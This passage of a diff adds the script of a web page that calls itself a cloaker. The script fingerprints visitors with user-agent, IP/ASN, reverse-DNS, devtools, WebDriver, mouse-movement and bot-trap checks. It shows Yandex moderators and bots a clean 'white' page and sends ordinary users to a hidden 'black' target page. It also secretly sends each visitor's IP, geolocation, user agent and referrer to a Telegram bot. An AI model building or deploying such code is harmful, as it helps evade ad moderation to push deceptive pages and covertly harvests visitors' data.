+                console.log('%c', 'font-size:0;');
+                const elapsedTime = performance.now() - startTime;
+                if (elapsedTime > 5) {
+                    return `Обнаружена открытая консоль (timing attack): ${elapsedTime}ms`;
+                }
+            }
+            
+            // Метод 4: Проверка на наличие расширений для модерации (для всех устройств)
+            if (typeof window.__REACT_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined') {
+                return 'Обнаружены инструменты разработчика React';
+            }
+            
+            if (typeof window.__REDUX_DEVTOOLS_EXTENSION__ !== 'undefined') {
+                return 'Обнаружены инструменты разработчика Redux';
+            }
+            
+            // Метод 5: Детектирование Selenium WebDriver (для всех устройств)
+            if ('webdriver' in navigator && navigator.webdriver === true) {
+                return 'Обнаружен WebDriver (navigator.webdriver = true)';
+            }
+            
+            return false;
+        }
+        
+        // Функция для трекинга количества посещений
+        function trackVisits() {
+            const VISIT_STORAGE_KEY = 'site_visits';
+            const current = new Date().getTime();
+            const thirtyMinutes = 30 * 60 * 1000;
+            
+            // Проверяем доступность localStorage
+            if (!window.localStorage) {
+                debugLog('localStorage недоступен');
+                return 0;
+            }
+            
+            let visits = [];
+            try {
+                const storedVisits = localStorage.getItem(VISIT_STORAGE_KEY);
+                if (storedVisits) {
+                    visits = JSON.parse(storedVisits);
+                }
+            } catch (e) {
+                debugLog(`Ошибка при чтении localStorage: ${e.message}`);
+                visits = [];
+            }
+            
+            // Убеждаемся, что visits - это массив
+            if (!Array.isArray(visits)) {
+                visits = [];
+            }
+            
+            // Удаляем старые посещения (старше 30 минут)
+            visits = visits.filter(time => (current - time) < thirtyMinutes);
+            
+            // Добавляем текущее посещение
+            visits.push(current);
+            
+            // Сохраняем обновленный список посещений
+            try {
+                localStorage.setItem(VISIT_STORAGE_KEY, JSON.stringify(visits));
+            } catch (e) {
+                debugLog(`Ошибка при записи в localStorage: ${e.message}`);
+            }
+            
+            debugLog(`Количество посещений за последние 30 минут: ${visits.length}`);
+            return visits.length;
+        }
+        
+        // Функция для проверки блокировки на основе частоты посещений и onoff.txt
+        async function isBlockedByFrequency() {
+            // Повышаем порог для мобильных устройств
+            const isMobile = isMobileDevice();
+            const visitThreshold = isMobile ? 8 : 5;
+            
+            const HOUR_BLOCK_KEY = 'hour_block_until';
+            const current = new Date().getTime();
+            
+            // Проверяем доступность localStorage
+            if (!window.localStorage) {
+                debugLog('localStorage недоступен');
+                return false;
+            }
+            
+            try {
+                // Сначала проверяем статус из onoff.txt
+                let frequencyCheckEnabled = false;
+                
+                try {
+                    const onoffContent = await loadFile('onoff.txt');
+                    const trimmedStatus = onoffContent.trim().toLowerCase();
+                    
+                    debugLog(`Содержимое onoff.txt: "${trimmedStatus}"`);
+                    
+                    // Если в файле 'off', отключаем проверку частоты
+                    if (trimmedStatus === 'off') {
+                        debugLog('Проверка частоты посещений отключена (onoff.txt = off)');
+                        frequencyCheckEnabled = false;
+                        
+                        // Даже если у пользователя есть блокировка, очищаем её
+                        localStorage.removeItem(HOUR_BLOCK_KEY);
+                        return false;
+                    } else {
+                        debugLog('Проверка частоты посещений включена (onoff.txt ≠ off)');
+                        frequencyCheckEnabled = true;
+                    }
+                } catch (error) {
+                    debugLog(`Ошибка при чтении onoff.txt: ${error.message}. Включаем проверку частоты по умолчанию.`);
+                    frequencyCheckEnabled = true; // По умолчанию включено
+                }
+                
+                // Если проверка отключена, прекращаем здесь
+                if (!frequencyCheckEnabled) {
+                    return false;
+                }
+                
+                // Проверяем, действует ли блокировка
+                const blockUntilStr = localStorage.getItem(HOUR_BLOCK_KEY);
+                if (blockUntilStr) {
+                    const blockUntil = parseInt(blockUntilStr);
+                    if (!isNaN(blockUntil) && blockUntil > current) {
+                        const blockTimeRemaining = Math.round((blockUntil - current) / 60000); // в минутах
+                        return `Активна блокировка по частоте до ${new Date(blockUntil).toLocaleString()} (осталось ${blockTimeRemaining} мин)`;
+                    } else {
+                        // Очищаем устаревшую блокировку
+                        localStorage.removeItem(HOUR_BLOCK_KEY);
+                    }
+                }
+                
+                // Если нет блокировки, проверяем количество посещений
+                const visits = trackVisits();
+                
+                debugLog(`Проверка частоты: ${visits} из ${visitThreshold} посещений`);
+                
+                if (visits > visitThreshold) {
+                    // Если больше порогового значения посещений за 30 минут, блокируем на час
+                    const oneHour = 60 * 60 * 1000;
+                    const blockUntil = current + oneHour;
+                    
+                    try {
+                        localStorage.setItem(HOUR_BLOCK_KEY, blockUntil.toString());
+                    } catch (e) {
+                        debugLog(`Ошибка при записи в localStorage: ${e.message}`);
+                    }
+                    
+                    return `Превышен лимит посещений (${visits} > ${visitThreshold})`;
+                }
+            } catch (e) {
+                debugLog(`Ошибка при проверке частоты посещений: ${e.message}`);
+            }
+            
+            return false;
+        }
+        
+        // Функция для проверки IP-адреса в списке запрещенных (для всех устройств)
+        async function isIpBlocked() {
+            // Получаем IP пользователя
+            let userIp = null;
+            
+            // Массив сервисов для получения IP
+            const ipServices = [
+                'https://api.ipify.org?format=json',
+                'https://ipinfo.io/json',
+                'https://api.myip.com'
+            ];
+            
+            // Пробуем получить IP через разные сервисы
+            for (const service of ipServices) {
+                try {
+                    const ipResponse = await fetch(service);
+                    if (!ipResponse.ok) continue;
+                    
+                    const ipData = await ipResponse.json();
+                    
+                    // Разные сервисы возвращают данные в разных форматах
+                    userIp = ipData.ip || ipData.myip;
+                    
+                    if (userIp) {
+                        debugLog(`Определен IP пользователя: ${userIp}`);
+                        break;
+                    }
+                } catch (error) {
+                    debugLog(`Ошибка при получении IP через ${service}: ${error.message}`);
+                    continue;
+                }
+            }
+            
+            // Если не удалось получить IP через внешние сервисы
+            if (!userIp) {
+                debugLog('Не удалось получить IP, пропускаем проверку');
+                return false;
+            }
+            
+            try {
+                // Загружаем список запрещенных IP
+                const blockedIpsText = await loadFile('blckip.txt');
+                const blockedIps = blockedIpsText.split('\n').map(ip => ip.trim()).filter(ip => ip);
+                
+                debugLog(`Загружено ${blockedIps.length} IP-адресов из блок-листа`);
+                
+                // Проверяем, находится ли IP пользователя в списке
+                const isBlocked = blockedIps.includes(userIp);
+                if (isBlocked) {
+                    return `IP пользователя ${userIp} найден в списке заблокированных`;
+                }
+                return false;
+            } catch (error) {
+                debugLog(`Ошибка при загрузке списка IP: ${error.message}`);
+                return false;
+            }
+        }
+        
+        // Асинхронная функция получения информации об IP-адресе и проверки принадлежности к Яндексу (для всех устройств)
+        async function isYandexIP() {
+            try {
+                // Пробуем получить информацию об IP через различные API
+                const ipServices = [
+                    'https://api.ipify.org?format=json',
+                    'https://ipapi.co/json/',
+                    'https://api.ipdata.co/?api-key=test',
+                    'https://ipinfo.io/json'
+                ];
+                
+                let ipInfo = null;
+                
+                // Пробуем каждый сервис по очереди до успеха
+                for (const service of ipServices) {
+                    try {
+                        const response = await fetch(service, { timeout: 2000 });
+                        if (response.ok) {
+                            ipInfo = await response.json();
+                            break;
+                        }
+                    } catch (e) {
+                        debugLog(`IP сервис ${service} недоступен: ${e.message}`);
+                        continue;
+                    }
+                }
+                
+                if (!ipInfo || !ipInfo.ip) {
+                    debugLog('Не удалось получить информацию об IP');
+                    return false;
+                }
+                
+                debugLog(`Определен IP: ${ipInfo.ip}`);
+                
+                // Проверяем аффилированность с Яндексом
+                // 1. Проверка ASN, если доступен
+                if (ipInfo.asn && YANDEX_ASN.some(asn => ipInfo.asn === asn || 
+                                                   ipInfo.asn.includes(asn))) {
+                    return `Обнаружен ASN Яндекса: ${ipInfo.asn}`;
+                }
+                
+                // 2. Проверка организации, если доступна
+                if (ipInfo.org && ipInfo.org.toLowerCase().includes('yandex')) {
+                    return `Обнаружена организация Яндекс: ${ipInfo.org}`;
+                }
+                
+                // 3. Проверка имени хоста, если доступно
+                if (ipInfo.hostname) {
+                    const hostname = ipInfo.hostname.toLowerCase();
+                    if (YANDEX_DOMAINS.some(domain => hostname.endsWith(domain))) {
+                        return `Обнаружен хост Яндекса: ${hostname}`;
+                    }
+                }
+                
+                // Получаем информацию о хосте через DNS-запрос (эмуляция reverse DNS lookup)
+                try {
+                    const dnsResponse = await fetch(`https://dns.google/resolve?name=${ipInfo.ip.split('.').reverse().join('.')}.in-addr.arpa&type=PTR`);
+                    if (dnsResponse.ok) {
+                        const dnsData = await dnsResponse.json();
+                        if (dnsData.Answer && dnsData.Answer.length > 0) {
+                            const hostname = dnsData.Answer[0].data.toLowerCase();
+                            debugLog(`Обратный DNS: ${hostname}`);
+                            // Проверяем, принадлежит ли домен Яндексу
+                            if (YANDEX_DOMAINS.some(domain => hostname.endsWith(domain))) {
+                                return `Обнаружен хост Яндекса через rDNS: ${hostname}`;
+                            }
+                        }
+                    }
+                } catch (e) {
+                    debugLog(`Обратный DNS-запрос не удался: ${e.message}`);
+                }
+                
+            } catch (e) {
+                debugLog(`Ошибка при проверке IP-адреса: ${e.message}`);
+            }
+            
+            return false;
+        }
+        
+        // Функция проверки ловушки для ботов
+        function setupBotTrap() {
+            try {
+                // Получаем ссылку-ловушку
+                const trapLink = document.querySelector('.bot-trap-link');
+                if (!trapLink) return;
+                
+                // Устанавливаем обработчик клика
+                trapLink.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    botTrapActivated = true;
+                    const reason = 'ЛОВУШКА! Бот активировал скрытую ссылку';
+                    debugLog(reason);
+                    
+                    // Отправляем отчет и перенаправляем
+                    collectUserInfo().then(userInfo => {
+                        sendTelegramReport(reason, userInfo);
+                        window.location.href = WHITE_PAGE;
+                    });
+                });
+                
+                // Отслеживаем наведение и другие взаимодействия
+                trapLink.addEventListener('mouseover', function() {
+                    botTrapActivated = true;
+                });
+                
+                trapLink.addEventListener('focus', function() {
+                    botTrapActivated = true;
+                });
+                
+                // Отслеживаем мутации
+                const observer = new MutationObserver((mutations) => {
+                    for (const mutation of mutations) {
+                        if (mutation.type === 'attributes') {
+                            botTrapActivated = true;
+                            break;
+                        }
+                    }
+                });
+                
+                observer.observe(trapLink, { 
+                    attributes: true,
+                    attributeFilter: ['style', 'class'] 
+                });
+            } catch (e) {
+                debugLog(`Ошибка при настройке ловушки для ботов: ${e.message}`);
+            }
+        }
+        
+        // Функция для отслеживания движения мыши (только для ПК)
+        function trackMouseMovement() {
+            if (!isMobileDevice()) {
+                document.addEventListener('mousemove', function() {
+                    hadMouseMovement = true;
+                }, { once: true });
+            }
+        }
+        
+        // Функция для отправки данных перед закрытием страницы
+        function setupEarlyExitTracking() {
+            // Отмечаем время начала загрузки
+            localStorage.setItem('page_load_started', Date.now().toString());
+            
+            // Отправка данных при уходе со страницы
+            window.addEventListener('beforeunload', async function() {
+                // Если страница полностью загружена, не считаем это ранним уходом
+                if (pageFullyLoaded) return;
+                
+                const userInfo = await collectUserInfo();
+                const timeOnPage = Date.now() - PAGE_LOAD_START;
+                
+                // Используем Beacon API для гарантированной отправки
+                const data = new FormData();
+                data.append('reason', `Ранний уход со страницы (${timeOnPage}мс)`);
+                data.append('userInfo', JSON.stringify(userInfo));
+                
+                // URL для Telegram API
+                const blockEmoji = '🏃‍♂️ *КЛОАКА: РАННИЙ УХОД*';
+                const message = `${blockEmoji}\n\n` +
+                    `⚠️ *Причина*: Пользователь покинул страницу до редиректа (${timeOnPage}мс)\n\n` +
+                    `📱 *Тип устройства*: ${userInfo.deviceType}\n` +
+                    `🔢 *Счетчик посещений*: ${userInfo.visitCount}\n` +
+                    `🌐 *IP*: ${userInfo.ip}\n` +
+                    `📍 *Геолокация*: ${userInfo.location}\n` +
+                    `🖥️ *User-Agent*: ${userInfo.userAgent}\n` +
+                    `🔗 *URL*: ${userInfo.url}\n` +
+                    `↩️ *Referrer*: ${userInfo.referrer || 'нет'}\n` +
+                    `🖱️ *Движение мыши*: ${userInfo.hadMouseMovement}`;
+                
+                const encodedMessage = encodeURIComponent(message);
+                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
+                
+                navigator.sendBeacon(telegramUrl);
+            });
+        }
+        
+        // Комплексная проверка на бота Яндекса (для всех устройств)
+        async function isYandexBot() {
+            // 1. Проверка на идентификаторы бота в User-Agent
+            const userAgent = navigator.userAgent.toLowerCase();
+            const yandexBotPatterns = [
+                /yandexbot/i, /yandex-bot/i, /yandexmobilebot/i, /yandexaccessibilitybot/i,
+                /yandex images/i, /yandex accessibility/i, /yandexsiteverification/i, /yandex-verification/i
+            ];
+            
+            for (const pattern of yandexBotPatterns) {
+                if (pattern.test(userAgent)) {
+                    return `Обнаружен бот Яндекса в User-Agent: ${pattern}`;
+                }
+            }
+            
+            // 2. Проверка поведения
+            const behaviorResult = isYandexBotByBehavior();
+            if (behaviorResult) {
+                return behaviorResult;
+            }
+            
+            // 3. Проверка на наличие iframe-yang.yandex
+            const iframeResult = hasYandexModeratorIframe();
+            if (iframeResult) {
+                return iframeResult;
+            }
+            
+            // 4. Проверка IP (может занять время, т.к. асинхронная)
+            try {
+                const ipResult = await isYandexIP();
+                if (ipResult) {
+                    return ipResult;
+                }
+            } catch (e) {
+                debugLog(`Ошибка при проверке IP Яндекса: ${e.message}`);
+            }
+            
+            return false;
+        }
+        
+        // Основная функция для определения, куда перенаправить пользователя
+        async function determineRedirectTarget() {
+            debugLog('Начало проверок...');
+            
+            // Собираем информацию о пользователе для потенциального отчета
+            const userInfo = await collectUserInfo();
+            
+            // Проверяем, является ли устройство мобильным
+            const isMobile = isMobileDevice();
+            debugLog(`Тип устройства: ${isMobile ? 'Мобильное' : 'Десктоп'}`);
+            
+            // --- ОСНОВНЫЕ ПРОВЕРКИ ДЛЯ ВСЕХ УСТРОЙСТВ ---
+            
+            // 1. Проверка ловушки для ботов
+            if (botTrapActivated) {
+                const trapReason = 'ЛОВУШКА! Бот активировал скрытую ссылку';
+                debugLog(`${trapReason} → WHITE_PAGE`);
+                await sendTelegramReport(trapReason, userInfo);
+                return WHITE_PAGE;
+            }
+            
+            // 2. Проверка на поисковых ботов (включая Яндекс) по User-Agent
+            const searchBotResult = isSearchBot();
+            if (searchBotResult) {
+                debugLog(`${searchBotResult} → WHITE_PAGE`);
+                await sendTelegramReport(searchBotResult, userInfo);
+                return WHITE_PAGE;
+            }
+            
+            // 3. Проверка на Headless браузеры и WebDriver
+            const headlessResult = isHeadlessBrowser();
+            if (headlessResult) {
+                debugLog(`${headlessResult} → WHITE_PAGE`);
+                await sendTelegramReport(headlessResult, userInfo);
+                return WHITE_PAGE;
+            }
+            
+            // 4. Проверка на наличие iframe-yang.yandex
+            const iframeResult = hasYandexModeratorIframe();
+            if (iframeResult) {
+                debugLog(`${iframeResult} → WHITE_PAGE`);
+                await sendTelegramReport(iframeResult, userInfo);
+                return WHITE_PAGE;
+            }
+            
+            // 5. Углубленная проверка на ботов Яндекса
+            const yandexBotResult = await isYandexBot();
+            if (yandexBotResult) {
+                debugLog(`${yandexBotResult} → WHITE_PAGE`);
+                await sendTelegramReport(yandexBotResult, userInfo);
+                return WHITE_PAGE;
+            }
+            
+            // 6. Проверка IP в черном списке
+            try {
+                const ipBlockResult = await isIpBlocked();
+                if (ipBlockResult) {
+                    debugLog(`${ipBlockResult} → WHITE_PAGE`);
+                    await sendTelegramReport(ipBlockResult, userInfo);
+                    return WHITE_PAGE;
+                }
+            } catch (e) {
+                debugLog(`Ошибка при проверке IP: ${e.message}`);
+            }
+            
+            // 7. Проверка на инструменты модерации/разработки
+            const moderatorResult = isLikelyModerator();
+            if (moderatorResult) {
+                debugLog(`${moderatorResult} → WHITE_PAGE`);
+                await sendTelegramReport(moderatorResult, userInfo);
+                return WHITE_PAGE;
+            }
+            
+            // --- ДОПОЛНИТЕЛЬНЫЕ ПРОВЕРКИ ТОЛЬКО ДЛЯ ДЕСКТОПОВ ---
+            
+            if (!isMobile) {
+                // 8. Проверка на движение мыши для ПК (если не было движения за 2 секунды)
+                if (Date.now() - PAGE_LOAD_START > 2000 && !hadMouseMovement) {
+                    const mouseReason = 'Подозрительно: отсутствие движения мыши на ПК';
+                    debugLog(`${mouseReason} → WHITE_PAGE`);
+                    await sendTelegramReport(mouseReason, userInfo);
+                    return WHITE_PAGE;
+                }
+                
+                // 9. Проверка частоты посещений (с учетом onoff.txt)
+                try {
+                    const frequencyResult = await isBlockedByFrequency();
+                    if (frequencyResult) {
+                        debugLog(`${frequencyResult} → WHITE_PAGE`);
+                        await sendTelegramReport(frequencyResult, userInfo);
+                        return WHITE_PAGE;
+                    }
+                } catch (e) {
+                    debugLog(`Ошибка при проверке частоты: ${e.message}`);
+                }
+            } else {
+                debugLog('Пропускаем проверку частоты и движения мыши для мобильного устройства');
+            }
+            
+            // --- ВЫБОР КОНЕЧНОЙ ССЫЛКИ ---
+            
+            // Проверяем наличие параметра code для выбора ссылки
+            debugLog('Все проверки пройдены, проверяем параметры URL');
+            
+            // Если параметр code есть, определяем целевую ссылку из links.txt
+            if (getUrlParameter('code')) {
+                try {
+                    const targetLink = await getTargetLinkFromFile();
+                    debugLog(`Выбрана ссылка на основе параметра code: ${targetLink}`);
+                    return targetLink;
+                } catch (e) {
+                    debugLog(`Ошибка при получении ссылки из links.txt: ${e.message}`);
+                    return BLACK_PAGE; // По умолчанию
+                }
+            }
+            
+            // По умолчанию, если параметра нет
+            debugLog('Параметр code не указан, используем BLACK_PAGE');
+            return BLACK_PAGE; // Для обычных пользователей - черная (целевая) страница
+        }
+        
+        // Настройка начальных трекеров
+        setupBotTrap();
+        trackMouseMovement();
+        setupEarlyExitTracking();
+        
+        // Запуск основной логики с таймером для анимации загрузки
+        window.onload = async function() {
+            try {
+                // Создаем маркер консоли для мониторинга
+                debugLog('[Клоака] Начало проверок');
+                
+                // Определяем, куда перенаправить
+                const redirectTarget = await determineRedirectTarget();
+                
+                debugLog(`[Клоака] Результат: перенаправление на ${redirectTarget}`);
+                
+                // Выполняем редирект после 1 секунды
+                setTimeout(() => {
+                    // Отмечаем, что страница полностью загружена перед редиректом
+                    pageFullyLoaded = true;
+                    window.location.href = redirectTarget;
+                }, 1000); // Задержка изменена на 1 секунду
+            } catch (error) {
+                debugLog(`Ошибка при определении редиректа: ${error.message}`);
+                
+                // Собираем информацию для отчета об ошибке
+                try {
+                    const userInfo = await collectUserInfo();
+                    await sendTelegramReport(`Критическая ошибка: ${error.message}`, userInfo);
+                } catch (e) {
+                    debugLog(`Не удалось отправить отчет об ошибке: ${e.message}`);
+                }
+                
+                // В случае ошибки перенаправляем на белую страницу
+                setTimeout(() => {
+                    pageFullyLoaded = true;
+                    window.location.href = WHITE_PAGE;
+                }, 1000); // Задержка изменена на 1 секунду
+            }
+        };
+    </script>
+</body>
+</html>
